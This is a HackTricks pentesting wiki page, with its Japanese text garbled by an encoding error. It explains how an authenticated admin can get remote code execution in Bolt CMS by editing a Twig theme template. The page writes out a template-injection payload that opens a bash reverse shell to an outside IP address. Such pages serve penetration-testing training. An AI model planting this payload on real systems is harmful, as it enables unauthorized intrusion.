# Bolt CMS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## RCE

ç®¡ç†è€…ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸå¾Œï¼ˆ/botã«ç§»å‹•ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ã€Bolt CMSã§RCEã‚’å–å¾—ã§ãã¾ã™ï¼š

* `Configuration` -> `View Configuration` -> `Main Configuration`ã‚’é¸æŠã™ã‚‹ã‹ã€URLãƒ‘ã‚¹`/bolt/file-edit/config?file=/bolt/config.yaml`ã«ç§»å‹•ã—ã¾ã™ã€‚
* ãƒ†ãƒ¼ãƒã®å€¤ã‚’ç¢ºèªã—ã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/image (771).png" alt=""><figcaption></figcaption></figure>

* `File management` -> `View & edit templates`ã‚’é¸æŠã—ã¾ã™ã€‚
* å‰ã®ã‚¹ãƒ†ãƒƒãƒ—ã§è¦‹ã¤ã‘ãŸãƒ†ãƒ¼ãƒãƒ™ãƒ¼ã‚¹ï¼ˆã“ã®å ´åˆã¯`base-2021`ï¼‰ã‚’é¸æŠã—ã€`index.twig`ã‚’é¸æŠã—ã¾ã™ã€‚
* ç§ã®å ´åˆã€ã“ã‚Œã¯URLãƒ‘ã‚¹/bolt/file-edit/themes?file=/base-2021/index.twigã«ã‚ã‚Šã¾ã™ã€‚
* [template injection (Twig)](../../pentesting-web/ssti-server-side-template-injection/#twig-php)ã‚’ä»‹ã—ã¦ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è¨­å®šã—ã¾ã™ã€‚ä¾‹ï¼š`{{['bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"']|filter('system')}}`
* å¤‰æ›´ã‚’ä¿å­˜ã—ã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/image (948).png" alt=""><figcaption></figcaption></figure>

* `Maintenance` -> `Clear the cache`ã§ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’ã‚¯ãƒªã‚¢ã—ã¾ã™ã€‚
* å†åº¦é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
